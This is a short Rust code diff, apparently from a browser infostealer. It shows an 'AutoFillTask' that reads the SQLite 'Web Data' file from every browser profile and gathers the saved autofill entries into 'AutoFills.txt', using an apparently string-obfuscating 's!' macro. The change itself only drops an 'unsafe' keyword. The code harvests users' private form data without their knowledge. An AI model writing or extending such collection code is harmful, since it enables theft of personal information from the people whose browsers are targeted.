@@ -25,7 +25,7 @@ impl AutoFillTask {
 impl<C: Collector> Task<C> for AutoFillTask {
     parent_name!("AutoFills.txt");
 
-    unsafe fn run(&self, parent: &Path, collector: &C) {
+    fn run(&self, parent: &Path, collector: &C) {
         let Some(mut autofills) = collect_and_read_sqlite_from_all_profiles(
             &self.browser.profiles,
             |profile| profile / s!("Web Data"),
